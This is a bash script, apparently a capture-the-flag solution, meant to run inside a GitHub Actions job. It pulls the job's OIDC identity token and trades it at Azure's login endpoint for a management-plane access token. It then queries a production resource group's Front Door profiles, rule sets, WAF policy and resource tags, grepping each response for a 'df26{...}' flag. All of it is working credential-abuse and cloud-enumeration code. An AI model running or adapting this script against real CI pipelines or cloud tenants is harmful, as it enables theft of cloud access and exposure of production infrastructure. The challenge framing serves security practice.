#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RG=rg-tbl-platform-prod-sea
J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
OARM=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
grepdf(){ printf '%s' "$1" | grep -oiE "df26\{[^}]*\}" && echo "  <<< FOUND in $2"; }
PFX="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers"
for path in \
 "Microsoft.Cdn/profiles/afd-tbl-prod?api-version=2023-05-01" \
 "Microsoft.Cdn/profiles/afd-tbl-prod/ruleSets?api-version=2023-05-01" \
 "Microsoft.Cdn/profiles/afd-tbl-prod/afdEndpoints?api-version=2023-05-01" \
 "Microsoft.Cdn/profiles/afd-tbl-prod/originGroups?api-version=2023-05-01" \
 "Microsoft.Network/frontdoorWebApplicationFirewallPolicies/waftblstorefrontprod?api-version=2022-05-01" ; do
  r=$(curl -sS "$PFX/$path" -H "Authorization: Bearer $OARM")
  echo "### ${path%%\?*}"
  echo "$r" | grep -oiE "df26\{[^}]*\}|customResponseBody|\"description\":\"[^\"]*\"" | head -10
done
echo "### rule sets -> rules (dump + grep df26)"
RS=$(curl -sS "$PFX/Microsoft.Cdn/profiles/afd-tbl-prod/ruleSets?api-version=2023-05-01" -H "Authorization: Bearer $OARM" | python3 -c 'import sys,json;print(" ".join(x["name"] for x in json.load(sys.stdin).get("value",[])))' 2>/dev/null)
for rs in $RS; do
  curl -sS "$PFX/Microsoft.Cdn/profiles/afd-tbl-prod/ruleSets/$rs/rules?api-version=2023-05-01" -H "Authorization: Bearer $OARM" | grep -oiE "df26\{[^}]*\}" && echo "  <<< in ruleset $rs"
done
echo "### WAF custom response (base64 of policy)"
curl -sS "$PFX/Microsoft.Network/frontdoorWebApplicationFirewallPolicies/waftblstorefrontprod?api-version=2022-05-01" -H "Authorization: Bearer $OARM" | python3 -c 'import sys,json;d=json.load(sys.stdin);p=d.get("properties",{});print("customResponseBody:",p.get("policySettings",{}).get("customBlockResponseBody"))'
echo "### resource tags"
curl -sS "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/resources?api-version=2021-04-01&\$expand=tags" -H "Authorization: Bearer $OARM" | grep -oiE "df26\{[^}]*\}|\"[a-zA-Z0-9_-]+\":\"df26[^\"]*\"" | head
echo END
